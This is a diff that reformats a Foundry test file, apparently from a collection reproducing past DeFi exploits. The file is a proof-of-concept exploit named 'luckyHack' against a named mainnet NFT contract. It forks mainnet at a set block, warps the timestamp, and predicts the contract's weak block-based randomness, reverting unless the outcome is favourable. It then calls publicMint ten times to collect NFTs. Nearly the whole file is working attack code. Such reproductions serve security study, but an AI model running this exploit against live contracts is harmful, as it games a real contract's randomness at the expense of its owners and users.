@@ -2,7 +2,6 @@
 
 pragma solidity ^0.8.13;
 
-
 import "forge-std/Test.sol";
 
 /*
@@ -12,63 +11,59 @@ import "forge-std/Test.sol";
 */
 
 interface NFT {
-    function balanceOf(address _owner) external view returns (uint balance);
+    function balanceOf(address _owner) external view returns (uint256 balance);
 }
 
 contract luckyHack is Test {
+    event Log(string);
 
-   event Log(string);
+    address owner = address(this);
+    address nftAddress = 0x9c87A5726e98F2f404cdd8ac8968E9b2C80C0967;
 
-   address owner      = address(this);
-   address nftAddress = 0x9c87A5726e98F2f404cdd8ac8968E9b2C80C0967;   
-   
     function setUp() public {
-        vm.createSelectFork("mainnet", 15403430); // fork mainnet block number 15403430
+        vm.createSelectFork("mainnet", 15_403_430); // fork mainnet block number 15403430
         vm.deal(address(this), 3 ether);
         vm.deal(address(nftAddress), 5 ether);
     }
 
-   function getRandom() public view returns(uint){
-        if(uint256(keccak256(abi.encodePacked(block.difficulty,block.timestamp))) % 2 == 0) {
+    function getRandom() public view returns (uint256) {
+        if (uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp))) % 2 == 0) {
             return 0;
-        }else{
+        } else {
             return 1;
         }
-   }
-
-
-   function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) {
-    return this.onERC721Received.selector;
-   }
-
-   function testExploit() public { 
-        vm.warp(1661351167);
-        console.log("getRandom",getRandom());
-
-        uint amount = 10;
-
-         if(uint256(keccak256(abi.encodePacked(block.difficulty,block.timestamp))) % 2 == 0) {
-           revert("Not lucky");
-         }
-        bytes memory data = abi.encodeWithSignature("publicMint()");
-
-        for(uint i=0; i<amount ; ++i){
- 
-           (bool status,) = address(nftAddress).call{value:0.01 ether}(data);          
-            if( !status ){
-            revert("error");
-         }else{
-            emit Log("success");
-         }
-
-        } 
-
-        console.log("NFT we got:",NFT(nftAddress).balanceOf(address(this)));
-   }
-
-   function getBalance() external view returns(uint256) {
-      return address(this).balance;
     }
 
-   receive() external payable {}
+    function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) {
+        return this.onERC721Received.selector;
+    }
+
+    function testExploit() public {
+        vm.warp(1_661_351_167);
+        console.log("getRandom", getRandom());
+
+        uint256 amount = 10;
+
+        if (uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp))) % 2 == 0) {
+            revert("Not lucky");
+        }
+        bytes memory data = abi.encodeWithSignature("publicMint()");
+
+        for (uint256 i = 0; i < amount; ++i) {
+            (bool status,) = address(nftAddress).call{value: 0.01 ether}(data);
+            if (!status) {
+                revert("error");
+            } else {
+                emit Log("success");
+            }
+        }
+
+        console.log("NFT we got:", NFT(nftAddress).balanceOf(address(this)));
+    }
+
+    function getBalance() external view returns (uint256) {
+        return address(this).balance;
+    }
+
+    receive() external payable {}
 }
